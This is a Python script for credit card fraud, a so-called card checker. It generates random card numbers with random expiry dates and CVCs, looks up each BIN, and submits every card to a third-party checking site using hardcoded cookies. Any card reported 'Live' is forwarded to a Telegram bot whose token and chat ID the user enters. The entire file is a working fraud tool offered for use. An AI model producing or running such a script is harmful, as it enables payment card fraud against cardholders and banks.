import os
import random

try:
    import requests
    from ms4 import BIN
except:
    os.system("pip install ms4==2.10.0")
    os.system("pip install requests")
    from ms4 import BIN
    import requests
    
E = '\033[1;31m'
F = '\033[2;32m'    
token = input("Enter Token : ")
ID = input("Enter ID : ")
def Generate_Num() -> str:
    h = [str("5" + str(random.randint(1, 9))) for _ in range(8)]
    g = [str("6" + str(random.randint(1, 9))) for _ in range(8)]
    j = [str("4" + str(random.randint(1, 9))) for _ in range(8)]
    
    P = random.choice([j, g, h])
    return ''.join(P)


def Ch(P: str):
    bb = BIN.Process_Bin(P)
    if bb["status"] == 'ok':        
        mm_and_cvc(P, bb)        
    else:
        print("An Error")


def mm_and_cvc(P: str, bb):
    yy = str(random.choice([2025, 2026, 2027, 2028, 2029, 2030]))
    mm = f"{random.choice(range(1, 13)):02d}"
    cvc = ''.join([str(random.randint(0, 9)) for _ in range(3)])
    card = P + '|' + mm + '|' + yy + '|' + cvc
    VisaCc(card, bb)


def VisaCc(card, bb):
    cookies = {
        '__gads': 'ID=3207b887e0ef18db-2256c3ac2be00097:T=1685888062:RT=1685888062:S=ALNI_Mb1Y57cSfMdAXlHRQN8rYn8XJBLwg',
        '__gpi': 'UID=00000c3d0c02546a:T=1685888062:RT=1685888062:S=ALNI_MZxOkOa0JM_SZj0VcbfSbymCzba5g',
        'PHPSESSID': 'npumq9cbbpngotau2a19oj3iu6',
    }
    headers = {
        'authority': 'checker.visatk.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://checker.visatk.com',
        'referer': 'https://checker.visatk.com/ccn1/',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'ajax': '1',
        'do': 'check',
        'cclist': card,
    }
    res = requests.post('https://checker.visatk.com/ccn1/alien07.php', cookies=cookies, headers=headers, data=data).text

    if 'Live' in res:
        tlg = f"""
card : {card}
<><><><><><><><>
info : {bb}
<><><><><><><><>
        """
        print(F+tlg)
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
    else:
        print(f'{E}Bad Card .!! : [ {card} ]')


if __name__ == "__main__":
    while True:
        P = Generate_Num()
        Ch(P)